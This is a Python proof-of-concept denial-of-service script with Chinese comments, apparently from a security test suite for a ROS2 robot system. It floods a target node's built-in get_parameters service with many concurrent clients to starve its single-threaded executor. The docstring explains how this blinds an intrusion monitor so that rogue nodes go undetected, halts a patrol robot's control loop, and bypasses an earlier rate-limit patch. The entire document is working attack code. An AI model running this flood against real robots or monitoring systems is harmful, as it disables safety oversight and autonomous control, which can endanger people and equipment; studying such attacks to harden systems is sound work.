#!/usr/bin/env python3
"""攻擊 N19 — Parameter-service flood DoS（餓死單執行緒 executor）.

漏洞：每個 ROS2 node 自動 expose 一組 parameter services：
    /<node>/get_parameters /set_parameters /list_parameters
    /describe_parameters /get_parameter_types
這些 callback 跑在 node 自己的 executor 上。dds_security_monitor / patrol_node
都用 rclpy.spin() = **single-threaded executor**。

→ 攻擊者用高併發狂打任一個 parameter service，callback 佔滿 executor，
   node 的其他 timer（monitor 的 graph poll + heartbeat；patrol 的 control loop）
   被餓死。

對比舊攻擊 L（/patrol/reload flood）：
    L 的修補是「rate-limit + 預設關閉 /patrol/reload」。
    但 parameter services **無法關閉、無法 app 層 rate-limit**（rclpy 內建）。
    → N19 繞過 L 的修補，打一個一定存在的服務面。

衝擊：
    - flood monitor → graph poll 停擺 → 攻擊者其他惡意節點趁 flood 窗口潛入不被偵測
    - flood monitor → heartbeat 停擺（但這會讓 IDS D5 fire，算 trade-off）
    - flood patrol → control loop 停擺 → 機器人失去自主控制

本 PoC：高併發呼叫目標 node 的 /get_parameters，製造 executor starvation。
量測由外部用 `ros2 topic hz /security/heartbeat` 比對 flood 前/中的頻率。
"""
import sys
import threading
import time

import rclpy
from rclpy.executors import (
    ExternalShutdownException,
    SingleThreadedExecutor,
)
from rclpy.node import Node
from rcl_interfaces.srv import GetParameters


def worker(target: str, stop_evt: threading.Event, idx: int, counter: list):
    node = Node(f'attacker_paramflood_{idx}')
    executor = SingleThreadedExecutor(context=node.context)
    try:
        executor.add_node(node)
        cli = node.create_client(GetParameters, f'/{target}/get_parameters')
        cli.wait_for_service(timeout_sec=5.0)
        while rclpy.ok() and not stop_evt.is_set():
            req = GetParameters.Request()
            req.names = [
                'poll_interval_sec',
                'whitelist',
                'emergency_stop_enabled',
            ]
            fut = cli.call_async(req)
            counter[idx] += 1
            executor.spin_until_future_complete(fut, timeout_sec=2.0)
    except (KeyboardInterrupt, ExternalShutdownException):
        pass
    except Exception:
        # Jazzy may surface context shutdown as a private RCLError class that
        # is not exported from rclpy.exceptions. Suppress only after the
        # shared context has actually shut down; real runtime errors re-raise.
        if rclpy.ok():
            raise
    finally:
        executor.remove_node(node)
        executor.shutdown(timeout_sec=0.5)
        node.destroy_node()


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else 'dds_security_monitor'
    n_workers = int(sys.argv[2]) if len(sys.argv) > 2 else 20
    duration = float(sys.argv[3]) if len(sys.argv) > 3 else 20.0

    rclpy.init()
    stop_evt = threading.Event()
    counter = [0] * n_workers
    threads = []
    print(f'🌊 N19: 用 {n_workers} 個併發 worker flood /{target}/get_parameters '
          f'{duration:.0f}s', flush=True)
    for i in range(n_workers):
        t = threading.Thread(target=worker, args=(target, stop_evt, i, counter),
                             daemon=True)
        t.start()
        threads.append(t)

    try:
        deadline = time.monotonic() + duration
        while rclpy.ok() and time.monotonic() < deadline:
            time.sleep(min(0.2, max(0.0, deadline - time.monotonic())))
    except KeyboardInterrupt:
        pass
    finally:
        stop_evt.set()
        for thread in threads:
            thread.join(timeout=2.5)
        total = sum(counter)
        print(f'⏹ 結束：{duration:.0f}s 內送出 {total} 次 get_parameters '
              f'(~{total/duration:.0f} req/s)', flush=True)
        if rclpy.ok():
            rclpy.shutdown()


if __name__ == '__main__':
    main()
